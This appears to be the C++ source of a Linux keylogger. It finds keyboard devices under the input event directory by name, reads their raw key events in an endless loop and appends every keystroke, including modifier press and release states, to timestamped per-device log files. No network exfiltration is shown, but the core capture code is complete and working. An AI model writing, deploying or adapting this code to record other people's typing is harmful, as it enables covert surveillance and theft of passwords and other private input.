#include <dirent.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/version.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <fstream>
#include <future>
#include <iomanip>
#include <iostream>
#include <regex>
#include <string>
#include <vector>

#include "constants.hh"

bool DEBUG = false;
void DEBUG_STDOUT(std::string msg) {
    if (DEBUG) std::cout << msg << std::endl;
}
void DEBUG_STDERR(std::string msg) {
    if (DEBUG) std::cerr << msg << std::endl;
}

static void* _startCapture(void* threadData);

static int _isEventDevice(const struct dirent* directory) {
    return strncmp(EVENT_DEVICE_NAME.c_str(), directory->d_name, 5) == 0;
}

class Keyboard {
   public:
    std::string devicePath, captureLog;
    int deviceFile;

    Keyboard(std::string devPath, std::string capLog) {
        devicePath = devPath, captureLog = capLog;
        deviceFile = -1;
    }

    ~Keyboard() { close(deviceFile); }

    void openDeviceFile() { deviceFile = open(devicePath.c_str(), O_RDONLY); }

    bool isModifierKey(const char* key);

    void capture();
};

bool Keyboard::isModifierKey(const char* key) {
    return (std::strncmp(key, "<su", 3) == 0 ||
            std::strncmp(key, "<l-", 3) == 0 ||
            std::strncmp(key, "<r-", 3) == 0);
}

void Keyboard::capture() {
    int readEvent, eventType;
    struct input_event keyEvent[64];
    const char* keyOutput;

    // Open log file and keyboard device file
    std::ofstream logFileStream(captureLog, std::ios::app);
    openDeviceFile();

    if (deviceFile > 0) {
        // Write timestamp
        std::time_t time = std::time(nullptr);
        logFileStream << "| UTC: " << std::put_time(std::gmtime(&time), "%c %Z")
                      << " |\n"
                      << "-------------------------------------\n";

        // Capture keystrokes
        while (true) {
            readEvent =
                read(deviceFile, keyEvent, sizeof(struct input_event) * 64);

            if (readEvent > 0) {
                eventType = keyEvent[1].value;
                keyOutput = keys[keyEvent[1].code];
                /* Record press and release for
                   modifier keys (shift, ctrl, and super) */
                if (eventType != 2 && isModifierKey(keyOutput)) {
                    logFileStream << keyOutput << " " << keyEvent[1].value
                                  << std::endl;
                    DEBUG_STDOUT(keyOutput + (" " + std::to_string(eventType)));
                } else if (eventType != 0 && !(isModifierKey(keyOutput))) {
                    logFileStream << keyOutput << std::endl;
                    DEBUG_STDOUT(keyOutput);
                }
            }
        }
    }
}

std::vector<Keyboard> findKeyboards() {
    struct dirent** nameList;
    std::vector<Keyboard> keyboards;

    // Get number and list of devices in event device directory
    int numDevices = scandir(INPUT_DEVICE_DIR.c_str(), &nameList,
                             _isEventDevice, versionsort);

    for (int i = 0; i < numDevices; ++i) {
        std::string deviceName, devicePath;
        char deviceInfo[256];
        int deviceFile = -1;

        // Get path to event device and open it
        deviceName = nameList[i]->d_name;
        devicePath = INPUT_DEVICE_DIR + deviceName;
        deviceFile = open(devicePath.c_str(), O_RDONLY);
        if (deviceFile < 0) {
            continue;
        }

        // Get event device information
        ioctl(deviceFile, EVIOCGNAME(sizeof(deviceInfo)), deviceInfo);
        close(deviceFile);

        // If device description matches the regex pattern, push onto vector
        std::regex keyboardNamePattern(".*[Kk]eyboard.*");
        if (std::regex_match(deviceInfo, keyboardNamePattern)) {
            DEBUG_STDOUT("Found keyboard: " + (std::string)deviceName);
            Keyboard keyboard(devicePath, deviceName + ".log");
            keyboards.push_back(keyboard);
        }
        free(nameList[i]);
    }
    if (not keyboards.size()) DEBUG_STDERR("No keyboards found.");

    return keyboards;
}
